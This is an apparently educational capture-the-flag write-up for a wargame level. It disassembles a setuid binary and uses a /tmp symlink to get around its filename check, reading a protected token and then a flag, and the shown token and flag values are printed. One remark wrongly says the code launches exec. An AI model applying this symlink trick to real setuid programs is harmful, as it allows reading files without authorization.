
## LEVEL 08

---

This level contains two files.

```shell
$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

I dont have access to token but I can execute level08. I use gdb to understand what level08 does.

```shell
$ gdb -q level08
Reading symbols from /home/user/level08/level08...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048554 <+0>:	    push   %ebp
   0x08048555 <+1>:	    mov    %esp,%ebp
   0x08048557 <+3>:	    and    $0xfffffff0,%esp
   0x0804855a <+6>:	    sub    $0x430,%esp
   0x08048560 <+12>:	mov    0xc(%ebp),%eax
   0x08048563 <+15>:	mov    %eax,0x1c(%esp)
   0x08048567 <+19>:	mov    0x10(%ebp),%eax
   0x0804856a <+22>:	mov    %eax,0x18(%esp)
   0x0804856e <+26>:	mov    %gs:0x14,%eax
   0x08048574 <+32>:	mov    %eax,0x42c(%esp)
   0x0804857b <+39>:	xor    %eax,%eax
   0x0804857d <+41>:	cmpl   $0x1,0x8(%ebp)
   0x08048581 <+45>:	jne    0x80485a6 <main+82>
   0x08048583 <+47>:	mov    0x1c(%esp),%eax
   0x08048587 <+51>:	mov    (%eax),%edx
   0x08048589 <+53>:	mov    $0x8048780,%eax
   0x0804858e <+58>:	mov    %edx,0x4(%esp)
   0x08048592 <+62>:	mov    %eax,(%esp)
   0x08048595 <+65>:	call   0x8048420 <printf@plt>
   0x0804859a <+70>:	movl   $0x1,(%esp)
   0x080485a1 <+77>:	call   0x8048460 <exit@plt>
   0x080485a6 <+82>:	mov    0x1c(%esp),%eax
   0x080485aa <+86>:	add    $0x4,%eax
   0x080485ad <+89>:	mov    (%eax),%eax
   0x080485af <+91>:	movl   $0x8048793,0x4(%esp)
   0x080485b7 <+99>:	mov    %eax,(%esp)
   0x080485ba <+102>:	call   0x8048400 <strstr@plt>
   0x080485bf <+107>:	test   %eax,%eax
   0x080485c1 <+109>:	je     0x80485e9 <main+149>
   0x080485c3 <+111>:	mov    0x1c(%esp),%eax
   0x080485c7 <+115>:	add    $0x4,%eax
   0x080485ca <+118>:	mov    (%eax),%edx
   0x080485cc <+120>:	mov    $0x8048799,%eax
   0x080485d1 <+125>:	mov    %edx,0x4(%esp)
   0x080485d5 <+129>:	mov    %eax,(%esp)
   0x080485d8 <+132>:	call   0x8048420 <printf@plt>
   0x080485dd <+137>:	movl   $0x1,(%esp)
   0x080485e4 <+144>:	call   0x8048460 <exit@plt>
   0x080485e9 <+149>:	mov    0x1c(%esp),%eax
   0x080485ed <+153>:	add    $0x4,%eax
   0x080485f0 <+156>:	mov    (%eax),%eax
   0x080485f2 <+158>:	movl   $0x0,0x4(%esp)
   0x080485fa <+166>:	mov    %eax,(%esp)
   0x080485fd <+169>:	call   0x8048470 <open@plt>
   0x08048602 <+174>:	mov    %eax,0x24(%esp)
   0x08048606 <+178>:	cmpl   $0xffffffff,0x24(%esp)
   0x0804860b <+183>:	jne    0x804862e <main+218>
   0x0804860d <+185>:	mov    0x1c(%esp),%eax
   0x08048611 <+189>:	add    $0x4,%eax
   0x08048614 <+192>:	mov    (%eax),%eax
   0x08048616 <+194>:	mov    %eax,0x8(%esp)
   0x0804861a <+198>:	movl   $0x80487b2,0x4(%esp)
   0x08048622 <+206>:	movl   $0x1,(%esp)
   0x08048629 <+213>:	call   0x8048440 <err@plt>
   0x0804862e <+218>:	movl   $0x400,0x8(%esp)
   0x08048636 <+226>:	lea    0x2c(%esp),%eax
   0x0804863a <+230>:	mov    %eax,0x4(%esp)
   0x0804863e <+234>:	mov    0x24(%esp),%eax
   0x08048642 <+238>:	mov    %eax,(%esp)
   0x08048645 <+241>:	call   0x8048410 <read@plt>
   0x0804864a <+246>:	mov    %eax,0x28(%esp)
   0x0804864e <+250>:	cmpl   $0xffffffff,0x28(%esp)
   0x08048653 <+255>:	jne    0x8048671 <main+285>
   0x08048655 <+257>:	mov    0x24(%esp),%eax
   0x08048659 <+261>:	mov    %eax,0x8(%esp)
   0x0804865d <+265>:	movl   $0x80487c4,0x4(%esp)
   0x08048665 <+273>:	movl   $0x1,(%esp)
   0x0804866c <+280>:	call   0x8048440 <err@plt>
   0x08048671 <+285>:	mov    0x28(%esp),%eax
   0x08048675 <+289>:	mov    %eax,0x8(%esp)
   0x08048679 <+293>:	lea    0x2c(%esp),%eax
   0x0804867d <+297>:	mov    %eax,0x4(%esp)
   0x08048681 <+301>:	movl   $0x1,(%esp)
   0x08048688 <+308>:	call   0x8048490 <write@plt>
   0x0804868d <+313>:	mov    0x42c(%esp),%edx
   0x08048694 <+320>:	xor    %gs:0x14,%edx
   0x0804869b <+327>:	je     0x80486a2 <main+334>
   0x0804869d <+329>:	call   0x8048430 <__stack_chk_fail@plt>
   0x080486a2 <+334>:	leave
   0x080486a3 <+335>:	ret
End of assembler dump.
```
Corrected version:

The source code of this executable should look something like this:

```c
int main (int ac, char **av)
{
    if (ac == 1) {
        printf("./level08 [file to read]");
        exit(1);
    }
    if (strstr(av[1], "token")) {
        printf("You may not access '%s'", av[1]);
        exit(1);
    }
    int fd = open(av[1], O_RDONLY);
    if (fd == -1) {
        err();
    } else {
        char buf[1024];
        int len = read(fd, buf, 1024);
        if (len == -1) {
            err();
        } else {
            write(1, buf, len);
        }
    }
    return 0;
}
```

This function launches the `exec` command, so I cannot run `getflag` through it. However, I think the flag is in `token`.

I cannot run `level08 token` because the code checks the string `token`. Instead, I will create a symlink to run `token` with another name.

```shell
$ ln -s /home/user/level08/token /tmp/file
$ ./level08 /tmp/file
quif5eloekouj29ke0vouxean
$ su flag08
Password: quif5eloekouj29ke0vouxean
$ getflag
Check flag. Here is your token: 25749xKZ8L7DkSCwJkT9dyv6f
```